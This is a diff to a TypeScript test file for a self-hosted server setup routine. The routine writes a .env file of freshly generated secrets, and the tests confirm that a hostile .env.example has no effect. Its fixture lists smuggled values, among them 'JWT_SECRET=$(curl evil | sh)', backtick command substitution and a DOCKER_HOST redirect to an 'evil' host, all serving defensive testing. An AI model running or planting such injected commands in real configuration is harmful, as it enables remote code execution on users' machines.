@@ -1,7 +1,8 @@
-import { chmod, mkdtemp, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
+import { chmod, lstat, mkdtemp, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { randomBytes } from "node:crypto";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import {
 	buildEnvContent,
 	nodeSetupDeps,
@@ -509,204 +510,121 @@ describe("saved stack folder", () => {
 });
 
 describe("first-time setup", () => {
-	const TEMPLATE = [
-		"# example",
-		"DATABASE_URL=postgres://multica:multica@localhost:5432/multica?sslmode=disable",
-		"POSTGRES_PASSWORD=multica",
-		"JWT_SECRET=change-me-in-production",
-		"MULTICA_VCS_SECRET_KEY=",
-		"FRONTEND_ORIGIN=http://localhost:3000",
-		"",
-	].join("\n");
 	const counter = () => {
 		let n = 0;
 		return (size: number) => Buffer.alloc(size, ++n);
 	};
+	const HOSTILE_EXAMPLES: Record<string, string> = {
+		"duplicate secrets": "JWT_SECRET=known-to-attacker\nJWT_SECRET=also-known\nPOSTGRES_PASSWORD=known\nPOSTGRES_PASSWORD=known2\nMULTICA_VCS_SECRET_KEY=known\n",
+		"export prefixes": "export JWT_SECRET=known\nexport POSTGRES_PASSWORD=known\n  export MULTICA_VCS_SECRET_KEY=known\n",
+		"indented and colon forms": "  JWT_SECRET=known\nJWT_SECRET: known\nPOSTGRES_PASSWORD =known\n",
+		"CRLF line endings": "JWT_SECRET=known\r\nPOSTGRES_PASSWORD=known\r\nJWT_SECRET=known2\r\n",
+		"quoted values": 'JWT_SECRET="known"\nPOSTGRES_PASSWORD=\'known\'\nMULTICA_VCS_SECRET_KEY="a b"\n',
+		"command substitution": "JWT_SECRET=$(curl evil | sh)\nPOSTGRES_PASSWORD=`id`\nMULTICA_VCS_SECRET_KEY=${IFS}x\n",
+		"multi-line quoted value": 'JWT_SECRET="line one\nPOSTGRES_PASSWORD=smuggled\nline three"\n',
+		"compose redirects": "COMPOSE_PROJECT_NAME=other\nCOMPOSE_FILE=/tmp/evil.yml\nMULTICA_BACKEND_IMAGE=evil/image\nDOCKER_HOST=tcp://evil:2375\n",
+		"binary and huge": `${"\u0000".repeat(100)}JWT_SECRET=known\n${"x".repeat(200_000)}`,
+	};
 
-	it("replaces the secrets like make selfhost does and leaves everything else alone", () => {
-		const content = buildEnvContent(TEMPLATE, counter());
+	it("writes a fixed layout of exactly three fresh secrets, with nothing else", () => {
+		const content = buildEnvContent(counter());
 
-		expect(content).toContain(`JWT_SECRET=${"01".repeat(32)}`);
-		expect(content).toContain(`POSTGRES_PASSWORD=${"02".repeat(24)}`);
-		expect(content).toContain(`MULTICA_VCS_SECRET_KEY=${Buffer.alloc(32, 3).toString("base64")}`);
-		expect(content).toContain(`DATABASE_URL=postgres://multica:${"02".repeat(24)}@localhost:5432/multica?sslmode=disable`);
-		expect(content).toContain("FRONTEND_ORIGIN=http://localhost:3000");
-		expect(content).not.toContain("change-me-in-production");
+		const assignments = content.split("\n").filter((line) => line !== "" && !line.startsWith("#"));
+		expect(assignments).toEqual([
+			`JWT_SECRET=${"01".repeat(32)}`,
+			`POSTGRES_PASSWORD=${"02".repeat(24)}`,
+			`MULTICA_VCS_SECRET_KEY=${Buffer.alloc(32, 3).toString("base64")}`,
+		]);
+		expect(content.endsWith("\n")).toBe(true);
+		expect(content.split("\n").filter((line) => line.startsWith("#"))).toHaveLength(2);
 	});
 
-	it("adds JWT_SECRET when the template has none, because the compose file requires it", () => {
-		expect(buildEnvContent("FRONTEND_ORIGIN=http://localhost:3000", counter())).toContain(`JWT_SECRET=${"01".repeat(32)}\n`);
-	});
-
-	describe("the template is untrusted input", () => {
-		const STACK = { dir: "/Users/me/.multica/server", file: "/Users/me/.multica/server/docker-compose.selfhost.yml" };
-		const fakeDeps = (template: string, patch: { uid?: number; mode?: number; gid?: number; type?: "file" | "link" | "dir"; size?: number; userId?: number | undefined } = {}) => {
-			const created: Array<{ file: string; content: string }> = [];
-			const deps: SetupDeps = {
-				randomBytes: (size) => Buffer.alloc(size, 7),
-				readTemplate: async () => template,
-				statTemplate: async () => ({
-					isFile: () => (patch.type ?? "file") === "file",
-					isDirectory: () => patch.type === "dir",
-					isSymbolicLink: () => patch.type === "link",
-					size: patch.size ?? template.length,
-					mode: patch.mode ?? 0o644,
-					uid: patch.uid ?? 501,
-					gid: patch.gid ?? 20,
-				}),
-				createFile: async (file, content) => {
-					created.push({ file, content });
-				},
-				uid: "userId" in patch ? patch.userId : 501,
-				gid: 20,
-			};
-			return { deps, created };
-		};
-
-		it("accepts a template owned by the user or root that others cannot write", async () => {
-			for (const [uid, mode] of [[501, 0o644], [501, 0o600], [0, 0o644], [501, 0o755]] as const) {
-				const { deps, created } = fakeDeps(TEMPLATE, { uid, mode });
-				expect(await setupStackEnv(STACK, deps), `${uid} ${mode.toString(8)}`).toBe("created");
-				expect(created).toHaveLength(1);
-			}
-		});
-
-		it("refuses a template owned by another user, whatever its mode, and writes nothing", async () => {
-			for (const mode of [0o644, 0o600, 0o666]) {
-				const { deps, created } = fakeDeps(TEMPLATE, { uid: 502, mode });
-				expect(await setupStackEnv(STACK, deps), mode.toString(8)).toBe("failed");
-				expect(created).toEqual([]);
-			}
-		});
-
-		it("refuses a template that group or others can write, even when the user owns it", async () => {
-			for (const mode of [0o666, 0o664, 0o660, 0o646, 0o622, 0o777]) {
-				const { deps, created } = fakeDeps(TEMPLATE, { uid: 501, mode });
-				expect(await setupStackEnv(STACK, deps), mode.toString(8)).toBe("failed");
-				expect(created).toEqual([]);
-			}
-		});
-
-		it("refuses a foreign-owned 0666 template (the reviewer's case)", async () => {
-			const { deps, created } = fakeDeps(`${TEMPLATE}JWT_SECRET=known-to-attacker\n`, { uid: 502, mode: 0o666 });
-			expect(await setupStackEnv(STACK, deps)).toBe("failed");
-			expect(created).toEqual([]);
-		});
-
-		it("does not judge ownership or mode where there is no user id (Windows)", async () => {
-			const { deps } = fakeDeps(TEMPLATE, { uid: 999, mode: 0o666, userId: undefined });
-			expect(await setupStackEnv(STACK, deps)).toBe("created");
-		});
-
-		it("refuses a symlink, a directory and an oversized template", async () => {
-			for (const patch of [{ type: "link" as const }, { type: "dir" as const }, { size: 70 * 1024 }]) {
-				const { deps, created } = fakeDeps(TEMPLATE, patch);
-				expect(await setupStackEnv(STACK, deps), JSON.stringify(patch)).toBe("failed");
-				expect(created).toEqual([]);
-			}
-		});
-
-		it("refuses a template that assigns a managed secret twice, however it is written, and writes nothing", async () => {
-			for (const duplicate of [
-				"JWT_SECRET=known-to-attacker",
-				"export JWT_SECRET=known-to-attacker",
-				"  JWT_SECRET=known-to-attacker",
-				"\tJWT_SECRET = known-to-attacker",
-				"JWT_SECRET: known-to-attacker",
-				"POSTGRES_PASSWORD=known",
-				"export POSTGRES_PASSWORD=known",
-				"MULTICA_VCS_SECRET_KEY=known",
-				"DATABASE_URL=postgres://multica:known@localhost:5432/multica",
-				" export DATABASE_URL=postgres://multica:known@localhost/db",
-			]) {
-				const { deps, created } = fakeDeps(`${TEMPLATE}${duplicate}\n`);
-				expect(await setupStackEnv(STACK, deps), duplicate).toBe("failed");
-				expect(created, duplicate).toEqual([]);
-			}
-		});
-
-		it("refuses a managed key hidden in an alternative form even when it is the only assignment", async () => {
-			for (const only of ["export JWT_SECRET=known", "  JWT_SECRET=known", "JWT_SECRET: known", "JWT_SECRET =known"]) {
-				const template = TEMPLATE.replace(/^JWT_SECRET=.*\n/m, "") + `${only}\n`;
-				expect(buildEnvContent(template, () => Buffer.alloc(32, 1)), only).toBeNull();
-			}
-		});
-
-		it("does not count comments or similar names as assignments", () => {
-			const template = `${TEMPLATE}# JWT_SECRET=old\n#export POSTGRES_PASSWORD=x\nMY_JWT_SECRET=other\nJWT_SECRET_FILE=/x\nPOSTGRES_PASSWORD_HINT=y\n`;
-			const content = buildEnvContent(template, (size) => Buffer.alloc(size, 1));
-			expect(content).not.toBeNull();
-			expect(content).toContain(`JWT_SECRET=${"01".repeat(32)}`);
-			expect(content).toContain("# JWT_SECRET=old");
-			expect(content).toContain("MY_JWT_SECRET=other");
-		});
-
-		it("wires the real current user into the real dependencies: a group-writable template on disk is refused", async () => {
-			if (process.getuid === undefined) return;
-			const dir = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-template-"));
-			try {
-				await writeFile(path.join(dir, ".env.example"), TEMPLATE, { mode: 0o644 });
-				const deps = nodeSetupDeps((size) => Buffer.alloc(size, 7));
-				expect(deps.uid).toBe(process.getuid());
-				expect(await setupStackEnv({ dir, file: path.join(dir, "docker-compose.selfhost.yml") }, deps)).toBe("created");
-				await rm(path.join(dir, ".env"));
-				await chmod(path.join(dir, ".env.example"), 0o666);
-				expect(await setupStackEnv({ dir, file: path.join(dir, "docker-compose.selfhost.yml") }, deps)).toBe("failed");
-				await expect(stat(path.join(dir, ".env"))).rejects.toThrow();
-			} finally {
-				await rm(dir, { recursive: true, force: true });
-			}
-		});
-
-		it("leaves exactly one assignment of each managed key in what it writes", async () => {
-			const { deps, created } = fakeDeps(TEMPLATE);
-			expect(await setupStackEnv(STACK, deps)).toBe("created");
-			const content = created[0]?.content ?? "";
-			for (const key of ["JWT_SECRET", "POSTGRES_PASSWORD", "MULTICA_VCS_SECRET_KEY", "DATABASE_URL"]) {
-				expect([...content.matchAll(new RegExp(`^[ \\t]*(?:export[ \\t]+)?${key}[ \\t]*[=:]`, "gm"))].length, key).toBe(1);
-			}
-		});
-
-		it("refuses a template that also carries a CRLF-smuggled duplicate", async () => {
-			const { deps, created } = fakeDeps(`${TEMPLATE.replace(/\n/g, "\r\n")}JWT_SECRET=known\r\n`);
-			expect(await setupStackEnv(STACK, deps)).toBe("failed");
-			expect(created).toEqual([]);
-		});
+	it("generates different, well-formed secrets every time: no whitespace, quotes, $ or backticks", () => {
+		const first = buildEnvContent((size) => randomBytes(size));
+		const second = buildEnvContent((size) => randomBytes(size));
+		expect(first).not.toBe(second);
+		const values = first.split("\n").filter((line) => /^[A-Z_]+=/.test(line)).map((line) => line.slice(line.indexOf("=") + 1));
+		expect(values).toHaveLength(3);
+		expect(values[0]).toMatch(/^[0-9a-f]{64}$/);
+		expect(values[1]).toMatch(/^[0-9a-f]{48}$/);
+		expect(values[2]).toMatch(/^[A-Za-z0-9+/]{43}=$/);
 	});
 
 	describe("on disk", () => {
 		let dir: string;
+		const stack = () => ({ dir, file: path.join(dir, "docker-compose.selfhost.yml") });
 		beforeEach(async () => {
 			dir = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-setup-"));
-			await writeFile(path.join(dir, ".env.example"), TEMPLATE);
 		});
-		afterEach(() => rm(dir, { recursive: true, force: true }));
-		const stack = () => ({ dir, file: path.join(dir, "docker-compose.selfhost.yml") });
+		afterEach(async () => {
+			// Only a regular file in the scratch folder is ever chmod-ed (never through a symlink).
+			const example = path.join(dir, ".env.example");
+			if ((await lstat(example).catch(() => null))?.isFile()) await chmod(example, 0o600);
+			await rm(dir, { recursive: true, force: true });
+		});
 
 		it("creates .env with mode 0600 and the generated secrets", async () => {
 			expect(await setupStackEnv(stack(), nodeSetupDeps((size) => Buffer.alloc(size, 7)))).toBe("created");
 			expect((await stat(path.join(dir, ".env"))).mode & 0o777).toBe(0o600);
-			expect(await readFile(path.join(dir, ".env"), "utf8")).toContain(`JWT_SECRET=${"07".repeat(32)}`);
+			expect(await readFile(path.join(dir, ".env"), "utf8")).toBe(buildEnvContent((size) => Buffer.alloc(size, 7)));
 		});
 
-		it("never overwrites an existing .env", async () => {
+		it("does not need, read or trust .env.example: a hostile one has no effect on what is written", async () => {
+			for (const [name, example] of Object.entries(HOSTILE_EXAMPLES)) {
+				await rm(path.join(dir, ".env"), { force: true });
+				await writeFile(path.join(dir, ".env.example"), example, { mode: 0o666 });
+				await chmod(path.join(dir, ".env.example"), 0o666);
+
+				expect(await setupStackEnv(stack(), nodeSetupDeps((size) => Buffer.alloc(size, 7))), name).toBe("created");
+
+				const written = await readFile(path.join(dir, ".env"), "utf8");
+				expect(written, name).toBe(buildEnvContent((size) => Buffer.alloc(size, 7)));
+				for (const marker of ["known", "evil", "smuggled", "COMPOSE_", "DOCKER_HOST", "$(", "`"]) expect(written, `${name}: ${marker}`).not.toContain(marker);
+			}
+		});
+
+		it("works with no .env.example at all, with an unreadable one and with a symlink in its place", async () => {
+			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("created");
+			await rm(path.join(dir, ".env"));
+			await writeFile(path.join(dir, ".env.example"), "JWT_SECRET=known\n", { mode: 0o000 });
+			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("created");
+			await rm(path.join(dir, ".env"));
+			await chmod(path.join(dir, ".env.example"), 0o600);
+			await rm(path.join(dir, ".env.example"));
+			await writeFile(path.join(dir, "secret-elsewhere"), "SECRET-FROM-ELSEWHERE=1\n");
+			await symlink(path.join(dir, "secret-elsewhere"), path.join(dir, ".env.example"));
+			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("created");
+			expect(await readFile(path.join(dir, ".env"), "utf8")).not.toContain("SECRET-FROM-ELSEWHERE");
+		});
+
+		it("never overwrites an existing .env, whatever it holds", async () => {
 			await writeFile(path.join(dir, ".env"), "JWT_SECRET=mine\n");
 			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("already_set_up");
 			expect(await readFile(path.join(dir, ".env"), "utf8")).toBe("JWT_SECRET=mine\n");
 		});
 
-		it("fails without writing when the template is missing or a symlink", async () => {
-			await rm(path.join(dir, ".env.example"));
-			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("failed");
-			await writeFile(path.join(dir, "elsewhere"), TEMPLATE);
-			await symlink(path.join(dir, "elsewhere"), path.join(dir, ".env.example"));
-			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("failed");
-			await expect(stat(path.join(dir, ".env"))).rejects.toThrow();
+		it("does not follow a symlink planted as .env", async () => {
+			await writeFile(path.join(dir, "elsewhere"), "untouched");
+			await symlink(path.join(dir, "elsewhere"), path.join(dir, ".env"));
+			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("already_set_up");
+			expect(await readFile(path.join(dir, "elsewhere"), "utf8")).toBe("untouched");
 		});
 
-		it("returns only an outcome word, never the content", async () => {
-			const deps: SetupDeps = { ...nodeSetupDeps(counter()), createFile: async () => undefined };
-			expect(await setupStackEnv(stack(), deps)).toBe("created");
+		it("reports a failed write without throwing, and returns only an outcome word", async () => {
+			const failing: SetupDeps = { randomBytes: counter(), createFile: async () => { throw Object.assign(new Error("EROFS"), { code: "EROFS" }); } };
+			expect(await setupStackEnv(stack(), failing)).toBe("failed");
+			const created: SetupDeps = { randomBytes: counter(), createFile: async () => undefined };
+			expect(await setupStackEnv(stack(), created)).toBe("created");
+		});
+
+		it("logs nothing while creating the file", async () => {
+			const spies = (["log", "info", "warn", "error", "debug"] as const).map((name) => vi.spyOn(console, name).mockImplementation(() => undefined));
+			try {
+				await setupStackEnv(stack(), nodeSetupDeps(counter()));
+				for (const spy of spies) expect(spy).not.toHaveBeenCalled();
+			} finally {
+				for (const spy of spies) spy.mockRestore();
+			}
 		});
 	});
 });
